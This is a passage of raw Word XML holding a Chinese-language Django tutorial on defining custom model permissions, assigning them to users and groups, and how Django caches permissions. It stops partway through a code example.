        <w:t>手动定义和分配权限(Permissions)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21EA329F" w14:textId="7A6A8F93" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>有时django创建的4种可选权限满足不了我们的要求，这时我们需要自定义权限。实现方法主要有两种。</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>下面我们将分别使用2种方法给Article模型新增了两个权限，一个是publish_article, 一个是comment_article。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A2678AA" w14:textId="4FC2ACC3" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>方法1. 在Model</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>的meta属性中添加permissions。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DEF0C9C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Article(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57F09715" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    ...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23246B09" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    class Meta:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5906BD7E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        permissions = (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E2C8D9E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            ("publish_article", "Can publish article"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="143D891F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">            ("comment_article", "Can comment article"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CF95F40" w14:textId="48D8AA7F" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05C80A7F" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>方法2. 使用ContentType程序化创建permissions。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DF2E237" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from blog.models import Article</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E9D69BA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.contrib.auth.models import Permission</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D14722F" w14:textId="58156BE2" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.contrib.contenttypes.models import ContentType</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45E59A5D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>content_type = ContentType.objects.get_for_model(article)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A5CBBE3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>permission1 = Permission.objects.create(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FBFC630" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    codename='publish_article',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45FE9EC5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    name='Can publish articles',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14536228" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    content_type=content_type,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="789E7C4D" w14:textId="0E907CEE" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EB7ADA6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>permission2 = Permission.objects.create(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F862AC5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    codename='comment_article',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50D82ACE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    name='Can comment articles',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60863453" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    content_type=content_type,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66476182" w14:textId="0FEF0B03" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B749AFB" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>当你使用python manage.py migrate命令后，你会发现Django admin的user permissions栏又多了两个可选权限。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="236A7876" w14:textId="179243E0" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A0DA60F" w14:textId="34392014" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果你不希望总是通过admin来给用户设置权限，你还可以在代码里手动给用户分配权限。这里也有两种实现方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28A8827D" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>方法1. 使用user.user_permissions.add()方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63A2C49C" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>myuser.user_permissions.add(permission1, permission2, ...)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="765D6E48" w14:textId="5261F760" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="795CC9A6" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>方法2. 通过user所在的用户组(group)给用户增加权限</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77B0CB21" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>mygroup.permissions.add(permission1, permission2, ...)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="546DAB7F" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E590061" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果你希望在代码中移除一个用户的权限，你可以使用remove或clear方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EBF61D5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>myuser.user_permissions.remove(permission, permission, ...)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79C19409" w14:textId="4CD576BD" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>myuser.user_permissions.clear()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12590EDD" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>注意权限的缓存机制</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D9BF5D8" w14:textId="210C1E22" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63335D32" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django会缓存每个用户对象，包括其权限user_permissions。当你在代码中手动改变一个用户的权限后，你必须重新获取该用户对象，才能获取最新的权限。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="397B33B4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="448B3F93" w14:textId="60A1C7CF" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D12C046" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>比如下例在代码中给用户手动增加了change_blogpost的权限，如果不重新载入用户，那么将显示用户还是没有change_blogpost的权限。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06834CA0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.contrib.auth.models import Permission, User</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29182D77" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.contrib.contenttypes.models import ContentType</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FA91726" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.shortcuts import get_object_or_404</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A4270A3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="35DEE0BB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from myapp.models import BlogPost</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0153396B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C57C410" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def user_gains_perms(request, user_id):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CE890DC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    user = get_object_or_404(User, pk=user_id)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16BF0C93" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # any permission check will cache the current set of permissions</w:t>
      </w:r>
    </w:p>
